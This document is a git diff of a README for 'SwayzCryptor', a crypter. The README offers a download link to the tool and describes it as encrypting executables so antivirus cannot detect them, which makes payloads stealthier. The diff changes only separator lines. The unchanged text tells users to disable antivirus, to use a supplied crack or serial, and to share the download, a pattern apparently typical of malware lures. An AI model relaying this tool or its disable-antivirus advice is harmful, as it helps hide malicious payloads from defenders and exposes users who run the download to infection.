@@ -5,6 +5,8 @@
 # DOWNLOAD FILE:
 [https://github.com/Swayz2k/SwayzCryptor---Obfuscator_Mutex_Start-up-/blob/main/SwayzCryptor.zip](https://github.com/Swayz2k/SwayzCryptor---Obfuscator_Mutex_Start-up-/raw/main/SwayzCryptor.zip)
 
+=====================================================================================
+
 1. DESCRIPTION
 
 =====================================================================================
@@ -15,22 +17,22 @@ This tool works by encrypting the source code of an executalbe, making it diffic
 
 The tool is designed to obfuscate software in a way that standard antivirus programs cannot easily identify. It's part of a broader category of software known as "crypters," which are widely used to enhance the stealth of payloads​.
 
-====================================================================
+=====================================================================================
 
 2. HOW TO USE
 
-====================================================================
+=====================================================================================
 
 0. Disable antivirus if needed [Mostly it's not needed].
 1. Install or Directly Run the Program.
 2. If necessary, use given crack or serial to register this software.
 3. Done, enjoy, share, like, and support us.
 
-====================================================================
+=====================================================================================
 
 3. ABOUT ANTIVIRUS AND COMPRESSED BINARIES
 
-====================================================================
+=====================================================================================
 
 This release's binary is packed with an executable/dll compression tool to
 reduce his size (for an easy and quick upload/download).
@@ -53,11 +55,11 @@ OF ANY THREAT; IN THAT CASE, I WILL NOT BE RESPONSIBLE FOR ANY DAMAGED CAUSED
 TO YOUR COMPUTER. YOU HAVE BEEN WARNED.
 ********************************************************************************
 
-====================================================================
+=====================================================================================
 
 4. DISCLAIMER
 
-====================================================================
+=====================================================================================
 
 This program is provided "AS IS" without any warranty, either expressed or
 implied, including, but not limited to, the implied warranties of
